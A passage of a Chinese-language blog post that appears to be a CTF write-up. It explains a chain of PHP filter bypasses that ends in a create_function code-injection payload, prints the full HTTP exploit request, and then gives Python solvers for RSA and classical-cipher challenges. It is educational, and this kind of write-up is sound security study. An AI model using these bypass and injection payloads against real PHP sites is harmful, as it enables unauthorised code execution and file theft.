+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);	<span class="comment">//这一段的意思是GET参数debu行以aqua_is_cute开始结束，因为^$正则匹配的是行的开始和结束，所以这里可以%0a换行绕过，如debu=aqua_is_cute%0a</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;	<span class="comment">//这一段是指请求的GET，POST和COOKIE输入不能为字母，但是默认优先级是ENV&lt;GET&lt;POST&lt;COOKIE&lt;SERVER，所以绕过这个只需要在GET输入所需字母的同时POST或COOKIE输入同名的字符，但值为数字即可</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);	<span class="comment">//这一段要获得$file的内容为debu_debu_aqua，可以用伪协议file=data:text/plain,debu_debu_aqua，php://input也可以</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;	<span class="comment">//sha()函数不能处理数组会返回false，所以用数组绕过就可以</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125;	<span class="comment">//这里原理和@phith0n在代码审计小密圈二周年的时候发起的Code-Breaking Puzzles挑战赛一题是一样的，不过加了些过滤，因为前面有extract($_GET["flag"]);这里可以控制flag的键名进行变量覆盖,payload为flag[code]=create_function&amp;flag[arg]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%99%93%9E%98%D1%8F%97%8F);require里面内容为php://filter/read=convert.base64-encode/resource=flag.php取反，</span></span><br></pre></td></tr></table></figure>
+
+<p>所以最终获取flag的请求包文如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /<span class="number">1</span>nD3x.php?%<span class="number">73</span>hana[]=<span class="number">1</span>&amp;p%<span class="number">61</span>sswd[]=<span class="number">2</span>&amp;%<span class="number">64</span>ebu=%<span class="number">61</span>qua_is_%<span class="number">63</span>ute%<span class="number">0</span>a&amp;file=data:text/plain,%<span class="number">64</span>ebu_%<span class="number">64</span>ebu_%<span class="number">61</span>qua&amp;fl%<span class="number">61</span>g[%<span class="number">63</span>ode]=create_function&amp;fl%<span class="number">61</span>g[%<span class="number">61</span>rg]=&#125;<span class="keyword">require</span>(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%C5%D0%D0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%C2%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F);<span class="comment">// HTTP/1.1</span></span><br><span class="line">Host: <span class="number">75</span>b7cb56<span class="number">-8851</span><span class="number">-40</span>d5-ac39-e2ec5886da7b.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 13</span></span><br><span class="line"><span class="comment">Origin: http://75b7cb56-8851-40d5-ac39-e2ec5886da7b.node3.buuoj.cn</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">debu=1&amp;file=1</span></span><br></pre></td></tr></table></figure>
+
+<p>crypto<br>1.这是base??<br>考察base编码的原理，根据原理写脚本解码即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">res2 = <span class="string">''</span></span><br><span class="line">dic = &#123;<span class="number">0</span>: <span class="string">'J'</span>, <span class="number">1</span>: <span class="string">'K'</span>, <span class="number">2</span>: <span class="string">'L'</span>, <span class="number">3</span>: <span class="string">'M'</span>, <span class="number">4</span>: <span class="string">'N'</span>, <span class="number">5</span>: <span class="string">'O'</span>, <span class="number">6</span>: <span class="string">'x'</span>, <span class="number">7</span>: <span class="string">'y'</span>, <span class="number">8</span>: <span class="string">'U'</span>, <span class="number">9</span>: <span class="string">'V'</span>, <span class="number">10</span>: <span class="string">'z'</span>, <span class="number">11</span>: <span class="string">'A'</span>, <span class="number">12</span>: <span class="string">'B'</span>, <span class="number">13</span>: <span class="string">'C'</span>, <span class="number">14</span>: <span class="string">'D'</span>, <span class="number">15</span>: <span class="string">'E'</span>, <span class="number">16</span>: <span class="string">'F'</span>, <span class="number">17</span>: <span class="string">'G'</span>, <span class="number">18</span>: <span class="string">'H'</span>, <span class="number">19</span>: <span class="string">'7'</span>, <span class="number">20</span>: <span class="string">'8'</span>, <span class="number">21</span>: <span class="string">'9'</span>, <span class="number">22</span>: <span class="string">'P'</span>, <span class="number">23</span>: <span class="string">'Q'</span>, <span class="number">24</span>: <span class="string">'I'</span>, <span class="number">25</span>: <span class="string">'a'</span>, <span class="number">26</span>: <span class="string">'b'</span>, <span class="number">27</span>: <span class="string">'c'</span>, <span class="number">28</span>: <span class="string">'d'</span>, <span class="number">29</span>: <span class="string">'e'</span>, <span class="number">30</span>: <span class="string">'f'</span>, <span class="number">31</span>: <span class="string">'g'</span>, <span class="number">32</span>: <span class="string">'h'</span>, <span class="number">33</span>: <span class="string">'i'</span>, <span class="number">34</span>: <span class="string">'j'</span>, <span class="number">35</span>: <span class="string">'k'</span>, <span class="number">36</span>: <span class="string">'l'</span>, <span class="number">37</span>: <span class="string">'m'</span>, <span class="number">38</span>: <span class="string">'W'</span>, <span class="number">39</span>: <span class="string">'X'</span>, <span class="number">40</span>: <span class="string">'Y'</span>, <span class="number">41</span>: <span class="string">'Z'</span>, <span class="number">42</span>: <span class="string">'0'</span>, <span class="number">43</span>: <span class="string">'1'</span>, <span class="number">44</span>: <span class="string">'2'</span>, <span class="number">45</span>: <span class="string">'3'</span>, <span class="number">46</span>: <span class="string">'4'</span>, <span class="number">47</span>: <span class="string">'5'</span>, <span class="number">48</span>: <span class="string">'6'</span>, <span class="number">49</span>: <span class="string">'R'</span>, <span class="number">50</span>: <span class="string">'S'</span>, <span class="number">51</span>: <span class="string">'T'</span>, <span class="number">52</span>: <span class="string">'n'</span>, <span class="number">53</span>: <span class="string">'o'</span>, <span class="number">54</span>: <span class="string">'p'</span>, <span class="number">55</span>: <span class="string">'q'</span>, <span class="number">56</span>: <span class="string">'r'</span>, <span class="number">57</span>: <span class="string">'s'</span>, <span class="number">58</span>: <span class="string">'t'</span>, <span class="number">59</span>: <span class="string">'u'</span>, <span class="number">60</span>: <span class="string">'v'</span>, <span class="number">61</span>: <span class="string">'w'</span>, <span class="number">62</span>: <span class="string">'+'</span>, <span class="number">63</span>: <span class="string">'/'</span>, <span class="number">64</span>: <span class="string">'='</span>&#125;</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>):</span><br><span class="line">        <span class="keyword">if</span>(j==dic[i]):</span><br><span class="line">            res += bin(i)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">res = res.split(<span class="string">'0b'</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    res[i] = res[i].rjust(<span class="number">7</span>,<span class="string">'0'</span>)</span><br><span class="line">res = <span class="string">''</span>.join(res)</span><br><span class="line">res = res.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">8</span>==<span class="number">7</span>):</span><br><span class="line">        res2 += chr(int(res[i<span class="number">-7</span>:i+<span class="number">1</span>],<span class="number">2</span>))</span><br><span class="line">print(res2)</span><br></pre></td></tr></table></figure>
+
+<p>2.signin<br>十六进制转字符串即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="string">'424a447b57653163306d655f74345f424a444354467d'</span></span><br><span class="line">print(bytes.fromhex(a))</span><br><span class="line"></span><br><span class="line">b = <span class="number">0x424a447b57653163306d655f74345f424a444354467d</span></span><br><span class="line">print(long_to_bytes(b))</span><br></pre></td></tr></table></figure>
+
+<p>3.Polybius<br>如题名是棋盘密码，是一张5*5的方表，以两个字符来代表一个字符，按要求写解密方式，下面是官方的payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"ouauuuoooeeaaiaeauieuooeeiea"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">'aeiou'</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span class="string">''</span>.join(i))</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    temp_cipher = <span class="string">""</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> cipher:</span><br><span class="line">        temp_cipher += str(each.index(temp))</span><br><span class="line"><span class="comment">#这里其实是将字母的表换成数字的表以便后续计算</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(temp_cipher),<span class="number">2</span>):</span><br><span class="line">        current_ascii = int(temp_cipher[i])*<span class="number">5</span>+int(temp_cipher[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line"><span class="comment">#因为棋盘密码是采用两位一起表示一个字母</span></span><br><span class="line">        <span class="keyword">if</span> current_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            current_ascii+=<span class="number">1</span></span><br><span class="line">        result += chr(current_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> result:</span><br><span class="line">        print(each,result)</span><br></pre></td></tr></table></figure>
+
+<p>4.rsa_output<br>rsa共模攻击，这里给出脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line">e1 = <span class="number">2767</span></span><br><span class="line">e2 = <span class="number">3659</span></span><br><span class="line">c1 = <span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line">c2 = <span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+<p>5.easyrsa<br>题目有一个p,q的关系式， p^2+q^2已知，n,e,c已知。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line">z = <span class="number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line">n = <span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">res1 = gmpy2.iroot(z+<span class="number">2</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">res2 = gmpy2.iroot(z<span class="number">-2</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = (res1+res2)//<span class="number">2</span></span><br><span class="line">q = res1-p</span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这道题意思就是知道n,e,c,p的平方加q的平方为z</span></span><br></pre></td></tr></table></figure>
+
+<p>6.RSA<br>q是两次的公约数，解一下即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># m = bytes_to_long(b'BJD'*32)</span></span><br><span class="line"><span class="comment"># n = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line"><span class="comment"># res = 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721</span></span><br><span class="line"><span class="comment"># for e in range(100000):</span></span><br><span class="line"><span class="comment">#     c = pow(m,e,n)</span></span><br><span class="line"><span class="comment">#     if(c==res):</span></span><br><span class="line"><span class="comment">#         print(e)</span></span><br><span class="line"><span class="comment">#         break     //求e</span></span><br><span class="line">e = <span class="number">52361</span></span><br><span class="line">n1 = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">n2 = <span class="number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line">q = gmpy2.gcd(n1,n2)</span><br><span class="line">p = n1//q</span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">c = <span class="number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span></span><br><span class="line">m = pow(c,d,n1)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i># CTF</a>
+            
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/12/22/2019GXYCTFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="next" title="2019-GXYCTFweb部分题解">
+                  <i class="fa fa-chevron-left"></i> 2019-GXYCTFweb部分题解
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/02/25/2020%E5%AE%89%E6%81%92%E4%BA%8C%E6%9C%88%E6%8A%97%E7%96%AB%E7%BB%83%E4%B9%A0%E8%B5%9B/" rel="prev" title="2020安恒二月抗疫练习赛web-crypto writeup">
+                  2020安恒二月抗疫练习赛web-crypto writeup <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LiM</p>
+  <div class="site-description" itemprop="description">念念不忘，必有回响</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LiM</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    
+    <span title="Symbols count total">82k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    
+    <span title="Reading time total">1:14</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">
+      
+    Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.2
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
